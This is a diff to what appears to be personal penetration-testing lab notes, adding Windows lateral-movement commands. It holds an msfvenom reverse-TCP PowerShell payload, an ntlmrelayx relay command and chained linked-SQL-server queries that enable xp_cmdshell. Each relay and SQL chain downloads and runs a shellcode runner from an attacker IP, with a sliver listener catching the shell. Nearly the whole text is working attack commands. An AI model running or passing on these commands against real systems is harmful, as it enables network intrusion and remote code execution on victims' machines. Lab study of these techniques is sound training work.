@@ -2048,14 +2048,19 @@ By using these techniques, you can potentially escalate your privileges in an en
 
 - configure stage listener using `sliver`
 - generate msfvenom powershell payload and add to `shellcode-runner.ps1`
+
 ```bash
 msfvenom -p windows/x64/custom/reverse_tcp LHOST=192.168.45.197 LPORT=9999 --format powershell
 ```
+
 - on kali start `impacket-ntlmxrelay` (*Note:* trying to base64 encode command string kept failing so I resorted to )
+
 ```bash
 ❯ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.188.6 -c "powershell -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197:8000/shellcode-runner.ps1')"
 ```
+
 - `sliver` received request
+
 ```bash
 [server] sliver > mtls -l 9001
 
@@ -2965,3 +2970,18 @@ EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT appserv01
 EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -NoProfile -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).downloadString(''''http://192.168.45.197:8000/shellcode-runner.ps1'''')'''';'') AT appserv01') AT dc01;
 
 ```
+
+- needed `iex (iwr ... -UseBasicParsing)`
+```sql
+username
+password
+appsrv01.corp1.com
+master
+EXEC sp_linkedservers
+select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')
+EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01
+EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01
+EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -NoProfile -ExecutionPolicy Bypass -Command iex (iwr http://192.168.45.197:8000/shellcode-runner.ps1 -UseBasicParsing)'''';'') AT appsrv01') AT dc01;
+
+```
+
